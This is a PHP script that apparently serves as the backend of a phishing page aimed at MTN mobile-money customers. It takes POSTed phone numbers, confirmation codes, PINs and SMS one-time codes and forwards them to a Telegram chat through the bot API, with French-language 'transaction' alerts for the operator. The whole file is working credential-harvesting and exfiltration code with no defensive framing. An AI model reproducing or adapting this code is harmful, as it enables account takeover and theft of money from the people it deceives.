<?php
header('Content-Type: application/json; charset=utf-8');

$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: 'YOUR_BOT_TOKEN';
$chatId   = getenv('TELEGRAM_CHAT_ID') ?: 'YOUR_CHAT_ID';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok'=>false,'error'=>'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?: [];
$type = $input['type'] ?? '';
$phone = trim((string)($input['phone'] ?? ''));
$tx1 = trim((string)($input['confirmation_code'] ?? ''));
$tx2 = trim((string)($input['sms_code'] ?? ''));

if ($type === 'msg1') {
    if ($phone === '' || $tx1 === '') {
        http_response_code(400);
        echo json_encode(['ok'=>false,'error'=>'Missing data']);
        exit;
    }
    $message = "🟠 NOUVELLE TRANSACTION\n\n" .
               "📱 Numéro MTN : {$phone}\n" .
               "🔢 Code de confirmation : {$tx1}";
} elseif ($type === 'msg2') {
    if ($phone === '' || $tx1 === '' || $tx2 === '') {
        http_response_code(400);
        echo json_encode(['ok'=>false,'error'=>'Missing data']);
        exit;
    }
    $message = "🟡🟡🟡 TRANSACTION 🟡🟡🟡\n\n" .
               "📱 Numéro MTN : {$phone}\n" .
               "🔢 PIN : {$tx1}\n" .
               "🆔 Code SMS. : {$tx2}";
} else {
    http_response_code(400);
    echo json_encode(['ok'=>false,'error'=>'Invalid message type']);
    exit;
}

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$post = http_build_query(['chat_id'=>$chatId,'text'=>$message]);

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 15,
]);
$response = curl_exec($ch);
$error = curl_error($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($error || $httpCode < 200 || $httpCode >= 300) {
    http_response_code(502);
    echo json_encode(['ok'=>false,'error'=>'Telegram request failed']);
    exit;
}

$result = json_decode($response, true);
if (!is_array($result) || empty($result['ok'])) {
    http_response_code(502);
    echo json_encode(['ok'=>false,'error'=>'Telegram rejected the message']);
    exit;
}

echo json_encode(['ok'=>true]);
